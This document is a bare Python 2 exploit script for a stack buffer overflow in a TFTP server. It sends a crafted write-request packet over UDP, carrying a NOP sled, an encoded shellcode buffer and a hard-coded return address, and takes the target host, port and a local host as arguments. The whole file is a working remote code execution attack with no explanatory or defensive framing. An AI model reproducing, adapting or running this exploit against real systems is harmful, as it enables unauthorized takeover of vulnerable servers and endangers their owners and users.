import sys, socket

host = sys.argv[1]
port = int(sys.argv[2])
lhost = sys.argv[3]

buf =  ""
buf += "\xb8\x76\x5f\x27\x90\xdb\xd9\xd9\x74\x24\xf4\x5e\x2b"
buf += "\xc9\xb1\x2e\x31\x46\x15\x83\xee\xfc\x03\x46\x11\xe2"
buf += "\x83\xde\xcb\x3c\x66\xe1\x13\xc1\x12\x0a\x54\xd1\x1b"
buf += "\x33\xa4\xde\xbb\xfd\x80\xaa\x46\xc2\xbd\xd1\x85\x42"
buf += "\xc3\xc6\x7e\xe5\xe3\x19\x6a\x81\xd0\x83\x6b\x78\x29"
buf += "\x74\xf2\x28\x8b\xbe\x09\x30\xce\xbb\xd1\x47\x38\x80"
buf += "\xb7\x9e\x0e\x72\xd4\xaa\x05\x32\x3e\x2c\xf3\xab\xb5"
buf += "\x32\x5a\xbf\x86\x56\x5d\x56\x1b\x4b\xc4\x21\x77\xb7"
buf += "\xea\x50\x78\x57\x23\x48\xe2\x13\x07\x5e\x61\x63\x84"
buf += "\x15\x05\x78\x39\xa2\x8d\x88\x1f\xd3\x1e\xef\xf7\x28"
buf += "\x92\x87\x70\x3c\xe0\x08\x2b\xa4\xbd\xc5\xb3\xd7\x6b"
buf += "\xbc\x67\x7b\xc0\xec\xc4\x28\xa5\x41\x42\x29\x4f\xe7"
buf += "\xbb\xbe\x8d\xb0\x10\xd9\x28\xd9\x48\xda\x9c\x40\xce"
buf += "\x8d\x4f\x72\xe6\x59\xe7\x4c\xaf\xed\x74\x2a\xd8\xe0"
buf += "\x26\xd5\x4b\x8a\x35\x73\x7c\xdf\xee\xe2\xc5\x88\x15"
buf += "\x14\xe3\x67\xa1\xe6\x5c\xdb\x9e\xa5\x3a\x62\xe0\x72"
buf += "\x3c\x72"

# 0x7e429353

ret = '\x53\x93\x42\x7e'
nop = "\x90" * (25-len(lhost))

exploit = "\x00\x02" + nop + buf + ret + "\x83\xc4\x28\xc3\x00netascii\x00"

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client.sendto(exploit, (host, port))